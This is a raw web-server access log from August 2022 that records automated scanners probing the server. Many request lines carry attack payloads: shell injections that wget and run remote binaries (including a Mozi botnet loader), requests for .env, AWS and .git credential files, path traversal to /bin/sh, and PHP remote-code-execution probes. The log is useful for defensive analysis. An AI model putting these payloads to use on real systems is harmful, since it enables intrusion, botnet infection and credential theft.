109.237.103.123 - - [11/Aug/2022:16:06:16 -0500] "POST /public/aws/credentials HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [11/Aug/2022:16:06:16 -0500] "GET /public/.aws HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [11/Aug/2022:16:06:17 -0500] "POST /public/.aws HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
130.61.239.252 - - [11/Aug/2022:16:22:27 -0500] "GET /shell?cd+/tmp;rm+-rf+*;wget+159.223.13.188/jaws;sh+/tmp/jaws HTTP/1.1" 301 292 "-" "Hello, world"
185.7.214.117 - - [11/Aug/2022:16:38:43 -0500] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
104.140.188.22 - - [11/Aug/2022:16:39:13 -0500] "GET / HTTP/1.1" 301 232 "-" "https://gdnplus.com:Gather Analyze Provide."
117.221.123.14 - - [11/Aug/2022:16:43:40 -0500] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 226 "-" "-"
109.205.213.8 - - [11/Aug/2022:16:55:49 -0500] "\x16\x03\x01" 400 226 "-" "-"
109.205.213.8 - - [11/Aug/2022:16:55:50 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)"
179.43.155.171 - - [11/Aug/2022:17:04:13 -0500] "\x16\x03\x01" 400 226 "-" "-"
179.43.155.171 - - [11/Aug/2022:17:04:13 -0500] "GET /static../.git/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"
185.7.214.117 - - [11/Aug/2022:17:23:14 -0500] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.71.199.178 - - [11/Aug/2022:17:25:49 -0500] "HEAD / HTTP/1.1" 301 - "https://www.bing.com" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36"
167.71.199.178 - - [11/Aug/2022:17:25:50 -0500] "GET /wp-login.php HTTP/1.1" 301 253 "http://skillscybersecurityok.com" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36"
167.71.199.178 - - [11/Aug/2022:17:25:51 -0500] "GET /wordpress/wp-login.php HTTP/1.1" 301 263 "http://skillscybersecurityok.com" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36"
167.71.199.178 - - [11/Aug/2022:17:25:51 -0500] "GET /blog/wp-login.php HTTP/1.1" 301 258 "http://skillscybersecurityok.com" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36"
167.71.199.178 - - [11/Aug/2022:17:25:52 -0500] "GET /wp/wp-login.php HTTP/1.1" 301 256 "http://skillscybersecurityok.com" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36"
128.14.134.170 - - [11/Aug/2022:17:33:02 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.223 - - [11/Aug/2022:18:25:12 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Aug/2022:18:25:13 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.117 - - [11/Aug/2022:18:41:48 -0500] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117 - - [11/Aug/2022:18:49:38 -0500] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
46.161.11.208 - - [11/Aug/2022:18:55:53 -0500] "GET / HTTP/1.0" 301 241 "http://skillscybersecurityok.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
195.3.222.18 - - [11/Aug/2022:18:56:04 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
195.3.222.18 - - [11/Aug/2022:18:56:04 -0500] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
93.173.71.240 - - [11/Aug/2022:19:52:23 -0500] "POST /HNAP1/ HTTP/1.0" 400 591 "-" "-"
185.7.214.117 - - [11/Aug/2022:20:03:32 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2001:470:1:332::175 - - [11/Aug/2022:20:14:34 -0500] "GET / HTTP/1.1" 400 226 "-" "-"
52.202.164.152 - - [11/Aug/2022:20:27:41 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/51.0.3112.71 Safari/537.32"
185.7.214.117 - - [11/Aug/2022:20:34:21 -0500] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.21.216.169 - - [11/Aug/2022:20:41:06 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
66.240.192.82 - - [11/Aug/2022:20:58:39 -0500] "\x16\x03\x01" 400 226 "-" "-"
66.240.192.82 - - [11/Aug/2022:20:59:25 -0500] "GET / HTTP/1.1" 301 232 "-" "'Mozilla/5.0 project_patchwatch'"
185.254.196.223 - - [11/Aug/2022:21:25:23 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Aug/2022:21:25:24 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.117 - - [11/Aug/2022:21:28:01 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117 - - [11/Aug/2022:21:51:18 -0500] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.222.210 - - [11/Aug/2022:21:55:45 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 zgrab/0.x"
72.13.62.43 - - [11/Aug/2022:22:11:14 -0500] "GET /robots.txt HTTP/1.1" 301 242 "-" "Mozilla/5.0 (compatible; ips-agent)"
72.13.62.43 - - [11/Aug/2022:22:11:15 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; ips-agent)"
157.55.39.68 - - [11/Aug/2022:22:20:18 -0500] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.121 - - [11/Aug/2022:22:20:22 -0500] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
144.202.36.16 - - [11/Aug/2022:22:35:36 -0500] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
195.3.222.18 - - [11/Aug/2022:22:45:16 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
195.3.222.18 - - [11/Aug/2022:22:45:16 -0500] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
185.83.144.103 - - [11/Aug/2022:22:46:00 -0500] "GET /phpinfo.html HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.83.144.103 - - [11/Aug/2022:22:46:01 -0500] "POST /phpinfo.html HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.66.76.154 - - [11/Aug/2022:22:51:37 -0500] "\x03" 400 226 "-" "-"
167.248.133.120 - - [11/Aug/2022:23:15:38 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
167.248.133.120 - - [11/Aug/2022:23:15:38 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.120 - - [11/Aug/2022:23:15:38 -0500] "PRI * HTTP/2.0" 400 226 "-" "-"
20.150.210.254 - - [11/Aug/2022:23:35:25 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.150.210.254 - - [11/Aug/2022:23:35:25 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.196.220.70 - - [11/Aug/2022:23:46:09 -0500] "GET / HTTP/1.1" 301 232 "-" "Linux Gnu (cow)"
185.254.196.223 - - [12/Aug/2022:00:25:44 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:00:25:44 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.142.125.210 - - [12/Aug/2022:02:25:58 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
162.142.125.210 - - [12/Aug/2022:02:25:58 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.210 - - [12/Aug/2022:02:25:58 -0500] "PRI * HTTP/2.0" 400 226 "-" "-"
31.7.58.162 - - [12/Aug/2022:02:46:15 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
195.3.222.18 - - [12/Aug/2022:02:50:29 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
195.3.222.18 - - [12/Aug/2022:02:50:29 -0500] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
112.46.68.31 - - [12/Aug/2022:02:53:10 -0500] "GET / HTTP/1.1" 400 226 "-" "-"
106.75.50.100 - - [12/Aug/2022:02:58:08 -0500] "GET / HTTP/1.0" 301 232 "-" "-"
175.107.0.248 - - [12/Aug/2022:03:23:45 -0500] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 301 285 "-" "-"
185.254.196.223 - - [12/Aug/2022:03:25:41 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:03:25:42 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.7.153.18 - - [12/Aug/2022:03:43:04 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
31.7.58.162 - - [12/Aug/2022:03:59:06 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
31.59.25.166 - - [12/Aug/2022:03:59:35 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
31.59.25.166 - - [12/Aug/2022:03:59:35 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.186.115.240 - - [12/Aug/2022:04:23:56 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
88.214.43.118 - - [12/Aug/2022:04:24:50 -0500] "GET /.aws.yml HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
88.214.43.118 - - [12/Aug/2022:04:24:50 -0500] "POST /.aws.yml HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.21.216.169 - - [12/Aug/2022:04:51:53 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
31.7.58.162 - - [12/Aug/2022:05:47:05 -0500] "GET /config/getuser?index=0 HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
159.203.66.114 - - [12/Aug/2022:05:48:52 -0500] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
168.232.14.243 - - [12/Aug/2022:05:59:42 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:06:26:13 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:06:26:14 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.196.220.70 - - [12/Aug/2022:06:42:52 -0500] "GET / HTTP/1.1" 301 232 "-" "Linux Gnu (cow)"
64.62.197.197 - - [12/Aug/2022:07:18:08 -0500] "GET / HTTP/1.1" 301 232 "-" "-"
64.62.197.197 - - [12/Aug/2022:07:19:44 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
64.62.197.210 - - [12/Aug/2022:07:22:12 -0500] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
20.150.210.254 - - [12/Aug/2022:07:50:48 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.150.210.254 - - [12/Aug/2022:07:50:48 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.131.66.209 - - [12/Aug/2022:08:11:58 -0500] "GET / HTTP/1.1" 301 232 "-" "curl/7.64.1"
113.31.102.176 - - [12/Aug/2022:08:46:25 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
154.209.125.64 - - [12/Aug/2022:09:01:05 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
185.254.196.223 - - [12/Aug/2022:09:25:57 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:09:25:57 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.60.149.55 - - [12/Aug/2022:10:08:44 -0500] "\x03" 400 226 "-" "-"
212.71.233.48 - - [12/Aug/2022:10:10:42 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
194.165.16.73 - - [12/Aug/2022:10:16:13 -0500] "\x03" 400 226 "-" "-"
194.165.16.73 - - [12/Aug/2022:10:16:13 -0500] "\x03" 400 226 "-" "-"
185.7.214.117 - - [12/Aug/2022:10:32:51 -0500] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
199.244.88.218 - - [12/Aug/2022:10:59:59 -0500] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"
67.227.83.6 - - [12/Aug/2022:11:04:46 -0500] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
185.220.100.254 - - [12/Aug/2022:11:15:44 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
209.141.49.169 - - [12/Aug/2022:11:30:30 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:11:34:32 -0500] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:12:02:50 -0500] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
194.233.89.214 - - [12/Aug/2022:12:04:32 -0500] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
38.91.106.96 - - [12/Aug/2022:12:08:00 -0500] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
38.91.106.96 - - [12/Aug/2022:12:08:01 -0500] "POST / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:12:25:52 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:12:25:53 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
62.233.50.179 - - [12/Aug/2022:12:34:32 -0500] "\x03" 400 226 "-" "-"
185.7.214.117 - - [12/Aug/2022:12:47:08 -0500] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.196.220.70 - - [12/Aug/2022:12:56:40 -0500] "GET / HTTP/1.1" 301 232 "-" "Linux Gnu (cow)"
185.21.216.169 - - [12/Aug/2022:13:14:23 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
23.251.102.74 - - [12/Aug/2022:13:23:39 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:13:24:45 -0500] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.118.160.57 - - [12/Aug/2022:13:49:25 -0500] "GET / HTTP/1.0" 301 233 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
185.7.214.117 - - [12/Aug/2022:14:17:15 -0500] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.118.53.194 - - [12/Aug/2022:14:17:39 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
34.78.6.216 - - [12/Aug/2022:14:18:37 -0500] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.1"
185.7.214.117 - - [12/Aug/2022:14:55:27 -0500] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:15:28:05 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:15:28:05 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:15:38:21 -0500] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.222.158 - - [12/Aug/2022:15:45:21 -0500] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
95.161.131.235 - - [12/Aug/2022:15:51:23 -0500] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 226 "-" "Mozilla/5.0 zgrab/0.x"
221.2.163.231 - - [12/Aug/2022:16:06:41 -0500] "\x16\x03\x01" 400 226 "-" "-"
185.7.214.117 - - [12/Aug/2022:16:20:10 -0500] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.144.17 - - [12/Aug/2022:16:30:25 -0500] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
116.179.33.14 - - [12/Aug/2022:16:59:05 -0500] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
116.179.32.109 - - [12/Aug/2022:16:59:05 -0500] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.51.118 - - [12/Aug/2022:16:59:21 -0500] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:17:29:15 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
201.220.151.94 - - [12/Aug/2022:17:58:27 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
51.81.167.146 - - [12/Aug/2022:18:13:51 -0500] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1"
185.7.214.117 - - [12/Aug/2022:18:19:04 -0500] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:18:25:30 -0500] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/Aug/2022:18:25:31 -0500] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:18:25:40 -0500] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.196.220.70 - - [12/Aug/2022:19:05:30 -0500] "GET / HTTP/1.1" 301 232 "-" "Linux Gnu (cow)"
